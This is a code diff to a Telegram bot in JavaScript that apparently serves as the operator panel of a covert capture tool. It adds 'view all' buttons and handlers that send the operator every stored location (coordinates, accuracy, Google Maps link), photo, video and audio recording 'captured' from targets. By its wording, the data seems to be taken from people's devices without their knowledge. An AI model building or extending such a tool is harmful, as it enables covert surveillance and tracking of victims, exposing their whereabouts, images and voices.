@@ -243,53 +243,26 @@ bot.on('text', async (ctx) => {
             const videos = data.filter(d => d.media_type === 'video');
             const audios = data.filter(d => d.media_type === 'audio');
             
-            // Summary message
+            // Summary message with view all buttons
             let msg = `📊 *ALL CAPTURED DATA*\n\n`;
             msg += `📍 Locations: ${locations.length}\n`;
             msg += `📷 Photos: ${photos.length}\n`;
             msg += `🎥 Videos: ${videos.length}\n`;
             msg += `🎤 Audio: ${audios.length}\n`;
             msg += `\n━━━━━━━━━━━━━━━━━━\n`;
+            msg += `\nTap a button below to view all items:`;
             
-            await ctx.reply(msg, { parse_mode: 'Markdown' });
+            // Build inline keyboard with available categories
+            const buttons = [];
+            if (locations.length > 0) buttons.push([Markup.button.callback(`📍 View All Locations (${locations.length})`, 'viewall_locations')]);
+            if (photos.length > 0) buttons.push([Markup.button.callback(`📷 View All Photos (${photos.length})`, 'viewall_photos')]);
+            if (videos.length > 0) buttons.push([Markup.button.callback(`🎥 View All Videos (${videos.length})`, 'viewall_videos')]);
+            if (audios.length > 0) buttons.push([Markup.button.callback(`🎤 View All Audio (${audios.length})`, 'viewall_audio')]);
             
-            // Show latest 5 locations with details
-            if (locations.length > 0) {
-                await ctx.reply(`📍 *LOCATIONS (Latest ${Math.min(5, locations.length)})*`, { parse_mode: 'Markdown' });
-                
-                const recentLocations = locations.slice(0, 5);
-                for (let i = 0; i < recentLocations.length; i++) {
-                    const loc = recentLocations[i];
-                    const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
-                    
-                    let locMsg = `📍 *Location ${i + 1}*\n`;
-                    locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n\n`;
-                    
-                    if (metadata.latitude && metadata.longitude) {
-                        locMsg += `🎯 Lat: \`${metadata.latitude}\`\n`;
-                        locMsg += `🎯 Lng: \`${metadata.longitude}\`\n`;
-                        if (metadata.accuracy) locMsg += `📏 Accuracy: ${metadata.accuracy}m\n`;
-                        locMsg += `\n[📍 Open in Google Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
-                    }
-                    
-                    await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
-                }
-            }
-            
-            // Show photos count and notify about files
-            if (photos.length > 0) {
-                await ctx.reply(`📷 *PHOTOS*\n\n${photos.length} photo(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
-            }
-            
-            // Show videos count
-            if (videos.length > 0) {
-                await ctx.reply(`🎥 *VIDEOS*\n\n${videos.length} video(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
-            }
-            
-            // Show audio count
-            if (audios.length > 0) {
-                await ctx.reply(`🎤 *AUDIO*\n\n${audios.length} audio recording(s) captured.\nFiles are stored on the server.`, { parse_mode: 'Markdown' });
-            }
+            await ctx.reply(msg, { 
+                parse_mode: 'Markdown',
+                ...Markup.inlineKeyboard(buttons)
+            });
             
         } catch (error) {
             logger.error('Failed to get all results', { error: error.message });
@@ -472,6 +445,237 @@ bot.on('text', async (ctx) => {
 // ============================================
 // Callback Query Handlers
 // ============================================
+
+/**
+ * Handle View All Locations
+ */
+bot.action('viewall_locations', async (ctx) => {
+    await ctx.answerCbQuery('Loading all locations...');
+    
+    try {
+        const telegramId = ctx.from.id.toString();
+        const result = await api.getAllCapturedData(telegramId);
+        
+        if (!result.success) {
+            await ctx.reply('❌ Failed to fetch locations');
+            return;
+        }
+        
+        const locations = result.data.filter(d => d.media_type === 'location');
+        
+        if (locations.length === 0) {
+            await ctx.reply('📍 No locations captured yet.');
+            return;
+        }
+        
+        await ctx.reply(`📍 *ALL LOCATIONS (${locations.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        // Send in batches of 10 to avoid flooding
+        for (let i = 0; i < locations.length; i++) {
+            const loc = locations[i];
+            const metadata = typeof loc.metadata === 'string' ? JSON.parse(loc.metadata) : loc.metadata;
+            
+            let locMsg = `📍 *Location ${i + 1}*\n`;
+            locMsg += `🕐 ${new Date(loc.created_at).toLocaleString()}\n`;
+            
+            if (metadata.latitude && metadata.longitude) {
+                locMsg += `🎯 \`${metadata.latitude}, ${metadata.longitude}\`\n`;
+                if (metadata.accuracy) locMsg += `📏 Accuracy: ${Math.round(metadata.accuracy)}m\n`;
+                locMsg += `[📍 Maps](https://www.google.com/maps?q=${metadata.latitude},${metadata.longitude})`;
+            }
+            
+            await ctx.reply(locMsg, { parse_mode: 'Markdown', disable_web_page_preview: true });
+            
+            // Small delay to avoid rate limiting
+            if (i > 0 && i % 10 === 0) {
+                await new Promise(r => setTimeout(r, 500));
+            }
+        }
+        
+        await ctx.reply(`✅ Showing all ${locations.length} location(s)`);
+        
+    } catch (error) {
+        logger.error('Failed to load all locations', { error: error.message });
+        await ctx.reply('❌ Error loading locations: ' + error.message);
+    }
+});
+
+/**
+ * Handle View All Photos
+ */
+bot.action('viewall_photos', async (ctx) => {
+    await ctx.answerCbQuery('Loading all photos...');
+    
+    try {
+        const telegramId = ctx.from.id.toString();
+        const result = await api.getAllCapturedData(telegramId);
+        
+        if (!result.success) {
+            await ctx.reply('❌ Failed to fetch photos');
+            return;
+        }
+        
+        const photos = result.data.filter(d => d.media_type === 'photo');
+        
+        if (photos.length === 0) {
+            await ctx.reply('📷 No photos captured yet.');
+            return;
+        }
+        
+        await ctx.reply(`📷 *ALL PHOTOS (${photos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        // Send each photo
+        for (let i = 0; i < photos.length; i++) {
+            const photo = photos[i];
+            const filePath = photo.file_path;
+            const caption = `📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}`;
+            
+            try {
+                // Try to send the actual photo file
+                const fs = require('fs');
+                const path = require('path');
+                const fullPath = path.join(__dirname, '..', 'server', filePath);
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithPhoto({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n📁 File: ${filePath}`);
+                }
+            } catch (photoErr) {
+                await ctx.reply(`📷 Photo ${i + 1}\n🕐 ${new Date(photo.created_at).toLocaleString()}\n📁 Stored on server`);
+            }
+            
+            // Rate limiting delay
+            if (i > 0 && i % 5 === 0) {
+                await new Promise(r => setTimeout(r, 1000));
+            }
+        }
+        
+        await ctx.reply(`✅ Showing all ${photos.length} photo(s)`);
+        
+    } catch (error) {
+        logger.error('Failed to load all photos', { error: error.message });
+        await ctx.reply('❌ Error loading photos: ' + error.message);
+    }
+});
+
+/**
+ * Handle View All Videos
+ */
+bot.action('viewall_videos', async (ctx) => {
+    await ctx.answerCbQuery('Loading all videos...');
+    
+    try {
+        const telegramId = ctx.from.id.toString();
+        const result = await api.getAllCapturedData(telegramId);
+        
+        if (!result.success) {
+            await ctx.reply('❌ Failed to fetch videos');
+            return;
+        }
+        
+        const videos = result.data.filter(d => d.media_type === 'video');
+        
+        if (videos.length === 0) {
+            await ctx.reply('🎥 No videos captured yet.');
+            return;
+        }
+        
+        await ctx.reply(`🎥 *ALL VIDEOS (${videos.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        // Send each video
+        for (let i = 0; i < videos.length; i++) {
+            const video = videos[i];
+            const filePath = video.file_path;
+            const sizeMB = video.file_size ? (video.file_size / (1024 * 1024)).toFixed(2) : '?';
+            const caption = `🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
+            
+            try {
+                const fs = require('fs');
+                const path = require('path');
+                const fullPath = path.join(__dirname, '..', 'server', filePath);
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithVideo({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Stored on server`);
+                }
+            } catch (videoErr) {
+                await ctx.reply(`🎥 Video ${i + 1}\n🕐 ${new Date(video.created_at).toLocaleString()}\n📁 Stored on server`);
+            }
+            
+            // Rate limiting delay for videos
+            if (i > 0) {
+                await new Promise(r => setTimeout(r, 2000));
+            }
+        }
+        
+        await ctx.reply(`✅ Showing all ${videos.length} video(s)`);
+        
+    } catch (error) {
+        logger.error('Failed to load all videos', { error: error.message });
+        await ctx.reply('❌ Error loading videos: ' + error.message);
+    }
+});
+
+/**
+ * Handle View All Audio
+ */
+bot.action('viewall_audio', async (ctx) => {
+    await ctx.answerCbQuery('Loading all audio...');
+    
+    try {
+        const telegramId = ctx.from.id.toString();
+        const result = await api.getAllCapturedData(telegramId);
+        
+        if (!result.success) {
+            await ctx.reply('❌ Failed to fetch audio');
+            return;
+        }
+        
+        const audios = result.data.filter(d => d.media_type === 'audio');
+        
+        if (audios.length === 0) {
+            await ctx.reply('🎤 No audio captured yet.');
+            return;
+        }
+        
+        await ctx.reply(`🎤 *ALL AUDIO (${audios.length})*\n━━━━━━━━━━━━━━━━━━`, { parse_mode: 'Markdown' });
+        
+        // Send each audio
+        for (let i = 0; i < audios.length; i++) {
+            const audio = audios[i];
+            const filePath = audio.file_path;
+            const sizeMB = audio.file_size ? (audio.file_size / (1024 * 1024)).toFixed(2) : '?';
+            const caption = `🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Size: ${sizeMB} MB`;
+            
+            try {
+                const fs = require('fs');
+                const path = require('path');
+                const fullPath = path.join(__dirname, '..', 'server', filePath);
+                
+                if (fs.existsSync(fullPath)) {
+                    await ctx.replyWithAudio({ source: fullPath }, { caption });
+                } else {
+                    await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Stored on server`);
+                }
+            } catch (audioErr) {
+                await ctx.reply(`🎤 Audio ${i + 1}\n🕐 ${new Date(audio.created_at).toLocaleString()}\n📁 Stored on server`);
+            }
+            
+            // Rate limiting delay
+            if (i > 0) {
+                await new Promise(r => setTimeout(r, 1500));
+            }
+        }
+        
+        await ctx.reply(`✅ Showing all ${audios.length} audio recording(s)`);
+        
+    } catch (error) {
+        logger.error('Failed to load all audio', { error: error.message });
+        await ctx.reply('❌ Error loading audio: ' + error.message);
+    }
+});
 
 /**
  * Handle session status check
